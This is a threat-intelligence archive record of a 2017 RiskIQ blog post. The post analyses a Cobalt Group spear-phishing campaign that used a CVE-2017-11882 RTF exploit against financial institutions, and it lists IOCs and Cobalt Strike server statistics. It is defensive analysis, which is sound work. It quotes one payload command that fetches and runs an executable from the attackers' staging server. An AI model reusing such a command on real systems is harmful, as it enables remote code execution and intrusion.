{
    "id": "5a4eb391-9ad8-458f-92ec-058f9c40fad1",
    "created_at": "2023-01-12T15:07:50.897375Z",
    "updated_at": "2025-03-27T02:16:08.487753Z",
    "deleted_at": null,
    "sha1_hash": "e3322cb25b5132a1fd7cfc8f3b90d27409b285ea",
    "title": "2017-11-28 - Gaffe Reveals Full List of Targets in Spear Phishing Attack Using Cobalt Strike Against Financial Institutions",
    "authors": "",
    "file_creation_date": "2022-05-28T03:59:07Z",
    "file_modification_date": "2022-05-28T03:59:07Z",
    "file_size": 533133,
    "plain_text": "# Gaffe Reveals Full List of Targets in Spear Phishing Attack Using Cobalt Strike Against Financial Institutions\n\n**riskiq.com/blog/labs/cobalt-strike/**\n\nNovember 28, 2017\n\nLabs\n\nNovember 28, 2017\n\nBy Yonathan Klijnsma\n\nIn a recent spear-phishing campaign, the Cobalt Hacking Group used a remote code\nexecution vulnerability in Microsoft Office software to connect to its command and control\nserver via Cobalt Strike. However, they gave up much more information than they intended.\n\nOn Tuesday, November 21, a massive spear-phishing campaign began targeting individual\nemployees at various financial institutions, mostly in Russia and Turkey. Purporting to\nprovide info on changes to ‘SWIFT’ terms, the email contained a single attachment with no\ntext in the body. It was an attempt by the Cobalt Group to gain a foothold in the networks of\nthe targeted individuals' organizations:\n\n\n-----\n\nFig-1 What the targets saw\n\nHowever, rather than putting their targets in BCC, the attackers put the entire list in the 'TO'\nfield allowing us to see their full list of intended targets. This isn’t the first time we've seen\nattackers make this error—back in March, an attack focussing on 1,880 targets across\nfinancial institutions in Kazakhstan had the same flaw.\n\n\n-----\n\nFig-2 As first seen on Twitter\n\n## Payload Analysis\n\n[The attachment in the email is an RTF document abusing the recently disclosed exploit](https://embedi.com/blog/skeleton-closet-ms-office-vulnerability-you-didnt-know-about)\nreferred to as [CVE-2017-11882 which is capable of leveraging Office 2007 to 2016 to](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-11882)\nexecute code. The file ‘Swift changes.rtf’ uses this exploit to start a remote payload like so:\n\n_cmd /c start \\\\138.68.234.128\\w\\w.exe &AAAAAC_\n\n\n-----\n\nThe payload is a stager for a tool known as Cobalt Strike which, normally, is used in red\nteaming and pen testing engagements. The framework has gained some notoriety with\n[adversaries as it's been used in multiple attacks against financial institutions in the past.](http://blog.trendmicro.com/trendlabs-security-intelligence/cobalt-spam-runs-use-macros-cve-2017-8759-exploit/)\n\n[The Cobalt Strike beacon eventually connects to 104.144.207.207 which is the group's](https://community.riskiq.com/search/104.144.207.207)\ncommand and control server for this attack. A very detailed analysis of the Cobalt Group’s\nactivities and the way they operate can be found here: [ Cobalt strikes back: an evolving\nmultinational threat to finance ].\n\n## Targets\n\nWe won’t be disclosing the recipients of the email, but we will take a look at the targeting\nfrom a geographical perspective. The majority of targeting was focused on Turkey and\nRussia, but there was also a broad attempt at a compromise, targeting employees of one\nfinancial institution in eight different countries.\n\nOur list of countries in which employees were targeted includes the United States,\nNetherlands, Italy, Austria, Ukraine, Turkey, Ukraine, Russia, Jordan, Kuwait, and the Czech\nRepublic:\n\nFig-3 Targeted countries highlighted in red\n\nOne thing we noticed when analyzing the targets of this campaign was that there were a lot\nof direct employee email addresses on the list, which make their emails more convincing.\nMore interesting is that the majority of these email addresses were found simply by Googling\nfor email addresses for the financial institution making it likely the attackers used open\nsource intelligence to gather their list of targets, and no prior information was needed to get\nthe addresses.\n\n\n-----\n\n## Finding More Cobalt Strike\n\nAt RiskIQ, one of the datasets built from our large quantities of Internet data is a repository of\nSSL certificates and where we've seen them. What’s interesting about the case mentioned\nabove is that the host is using a certificate seemingly shipped with Cobalt Strike by default.\nWe can look up the certificate in RiskIQ Community via its SHA1 fingerprint:\n[6ece5ece4192683d2d84e25b0ba7e04f9cb7eb7c](https://community.riskiq.com/search/certificate/sha1/6ece5ece4192683d2d84e25b0ba7e04f9cb7eb7c)\n\nFig-4 SSL data inside RiskIQ Community\n\nWhat we find is that at least a 100 different hosts seem to have been running an HTTPS\n[server with the same certificate. If we jump over to our SIS API, we find that there have been](https://www.riskiq.com/products/security-intelligence-services/)\n816(!) hosts running an HTTPS server with this certificate—all Cobalt Strike servers using a\ndefault certificate. To ensure our findings were correct, we confirmed them with previously\nreported threats that involved Cobalt Strike.\n\nFrom the data gathered through SIS, we can create some statistics on the setup of these\nCobalt Strike servers. Port usage:\n\n**Port** **Hosts observed**\n\n443 811\n\n465 4\n\n995 1\n\nBelow is the amount of Cobalt Strike servers actively seen in our data from June 2015 until\nMarch 2016:\n\n\n-----\n\nFig-5 Instances of Cobalt Strike servers detected by RiskIQ\n\nOne thing to keep in mind is that Cobalt Strike is not always used by adversaries with\nmalicious intent. Formally, Cobalt Strike is sold as a toolset for pen testing and red teaming\nengagements.\n\nWe’ve put all the hosts we’ve seen running Cobalt Strike with a default SSL certificate in a\nRiskIQ Community project. The SSL certificate is also included in this set:\n[https://community.riskiq.com/projects/19bb67dd-2c51-7284-e5f2-7b79537e13d3](https://community.riskiq.com/projects/3dbf939a-fcac-948d-07dc-4f657747bca5?guest=true&utm_campaign=research_cobaltstrike&utm_source=blog&utm_medium=blog&utm_content=project_cobaltstrike)\n\n## Indicators of Compromise (IOCs)\n\nThe following IOCs are only related to the above spear-phishing campaign. The larger set of\nCobalt Strike servers we identified can be found in this RiskIQ Community Project mentioned\nin the previous section.\n\n## Network IOCs\n\n**Domain** **IP Address** **Purpose**\n\n - 138.68.234.128 Payload staging server\n\n - 104.144.207.207 Cobalt Strike server\n\n## Filesystem IOCs\n\n**Filename** **MD5** **Purpose**\n\n\nSwift\nchanges.rtf\n\n\nf360d41a0b42b129f7f0c29f98381416 CVE-2017-11882 exploit document\ndownloading Cobalt Strike beacon\n\n\nw.exe d46df9eacfe7ff75e098942e541d0f18 Cobalt Strike beacon\n\n## Learn More\n\n\n-----\n\nRiskIQ gathers petabytes of data through crawling the entire internet and has amassed data\nsets that include SSL certificates and many more. SSL certificates can provide context by\nshowing whether a domain or IP is legitimate based on its certificate, identify self-signed\ncertificates versus third-party authority, and identify IP clusters and additional certificates\n[based on shared certificates. Click here for more information about how analysts can use](https://www.riskiq.com/platform/architecture/internet-data-sets/)\nSSL certificates to connect disparate malicious network infrastructure.\n\nTrack the IOCs from this attack, including those listed above, in the RiskIQ Community\n[Project located here.](https://community.riskiq.com/projects/3dbf939a-fcac-948d-07dc-4f657747bca5?guest=true&utm_campaign=research_cobaltstrike&utm_source=blog&utm_medium=blog&utm_content=project_cobaltstrike)\n\n## Subscribe to Our Newsletter\n\nSubscribe to the RiskIQ newsletter to stay up-to-date on our latest content, headlines,\nresearch, events, and more.\n\nBase Editor\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2017/2017-11-28 - Gaffe Reveals Full List of Targets in Spear Phishing Attack Using Cobalt Strike Against Financial Institutions.pdf"
    ],
    "report_names": [
        "2017-11-28 - Gaffe Reveals Full List of Targets in Spear Phishing Attack Using Cobalt Strike Against Financial Institutions.pdf"
    ],
    "threat_actors": [
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "5a0483f5-09b3-4673-bb5a-56d41eaf91ed",
            "created_at": "2023-01-06T13:46:38.814104Z",
            "updated_at": "2025-03-27T02:00:02.925972Z",
            "deleted_at": null,
            "main_name": "MageCart",
            "aliases": [],
            "source_name": "MISPGALAXY:MageCart",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "2dfaa730-7079-494c-b2f0-3ff8f3598a51",
            "created_at": "2022-10-25T16:07:23.474746Z",
            "updated_at": "2025-03-27T02:02:09.822683Z",
            "deleted_at": null,
            "main_name": "Cobalt Group",
            "aliases": [
                "ATK 67",
                "Cobalt Gang",
                "Cobalt Spider",
                "Gold Kingswood",
                "Mule Libra",
                "TAG-CR3"
            ],
            "source_name": "ETDA:Cobalt Group",
            "tools": [
                "ATMRipper",
                "ATMSpitter",
                "Agentemis",
                "AmmyyRAT",
                "AtNow",
                "COOLPANTS",
                "CobInt",
                "Cobalt Strike",
                "CobaltStrike",
                "Cyst Downloader",
                "Fareit",
                "FlawedAmmyy",
                "Formbook",
                "Little Pig",
                "Metasploit Stager",
                "Mimikatz",
                "More_eggs",
                "NSIS",
                "Nullsoft Scriptable Install System",
                "Pony Loader",
                "Ripper ATM",
                "SDelete",
                "Siplog",
                "SoftPerfect Network Scanner",
                "SpicyOmelette",
                "Taurus Builder",
                "Taurus Builder Kit",
                "Taurus Loader",
                "Terra Loader",
                "ThreatKit",
                "VenomKit",
                "cobeacon",
                "win.xloader"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "c11abba0-f5e8-4017-a4ee-acb1a7c8c242",
            "created_at": "2022-10-25T15:50:23.744036Z",
            "updated_at": "2025-03-27T02:00:55.537114Z",
            "deleted_at": null,
            "main_name": "Cobalt Group",
            "aliases": [
                "Cobalt Group",
                "GOLD KINGSWOOD",
                "Cobalt Gang",
                "Cobalt Spider"
            ],
            "source_name": "MITRE:Cobalt Group",
            "tools": [
                "Mimikatz",
                "More_eggs",
                "SpicyOmelette",
                "SDelete",
                "Cobalt Strike",
                "PsExec"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673536070,
    "ts_updated_at": 1743041768,
    "ts_creation_date": 1653710347,
    "ts_modification_date": 1653710347,
    "files": {
        "pdf": "https://archive.orkl.eu/e3322cb25b5132a1fd7cfc8f3b90d27409b285ea.pdf",
        "text": "https://archive.orkl.eu/e3322cb25b5132a1fd7cfc8f3b90d27409b285ea.txt",
        "img": "https://archive.orkl.eu/e3322cb25b5132a1fd7cfc8f3b90d27409b285ea.jpg"
    }
}